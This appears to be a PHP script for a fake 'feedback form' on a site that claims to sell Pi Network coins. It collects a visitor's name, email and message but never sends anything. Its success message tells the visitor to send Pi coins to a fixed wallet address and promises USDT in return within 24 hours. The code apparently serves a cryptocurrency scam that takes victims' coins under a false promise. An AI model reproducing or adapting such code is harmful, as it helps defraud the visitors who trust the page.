<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = trim($_POST["name"]);
    $email = trim($_POST["email"]);
    $message = trim($_POST["message"]);

    // Check if all fields are correct
    if (!empty($name) && !empty($email) && !empty($message)) {
        // Set your email address here
        $to = "pinetworkfastsell@gmail.com";

        $subject = "Message from the feedback form";
        $body = "Name: $name\nEmail: $email\n\n$message";

        // Display success message
        echo "Send your pi coins to this address GDWCMCK7HLJI6TF3LYOTSZ2OYZ4YWNSO4G37N6QJO3FHI2EMMKO3NH7U and within 24 hours you will receive the corresponding USDT at your specified address.";
    } else {
        // Display error message
        echo "Your sale has been suspended, an error has been detected.";
    }
}
?>